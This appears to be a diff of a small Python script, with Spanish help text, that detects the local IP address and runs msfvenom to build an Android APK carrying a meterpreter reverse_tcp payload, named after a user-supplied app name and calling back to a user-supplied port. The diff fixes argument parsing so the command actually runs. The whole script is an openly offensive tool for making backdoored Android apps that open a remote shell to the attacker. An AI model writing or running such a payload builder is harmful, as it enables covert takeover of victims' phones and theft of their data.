@@ -1,8 +1,6 @@
 import socket
 import argparse
 
-
-
 def get_ip_address():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
@@ -23,8 +21,11 @@ parser.add_argument('app_name', metavar='name', type=str, nargs='+',
                     help='nombre de la app')
 parser.add_argument('lp', metavar='lp', type=str, nargs='+',
                     help='local port')
+args = parser.parse_args()
+
+print args.lp
 
 ipl = get_ip_address()
-com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp+" R >"+app_name+".apk"
+com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+args.lp[0]+" R >"+args.app_name[0]+".apk"
 
 launchProcess(com)
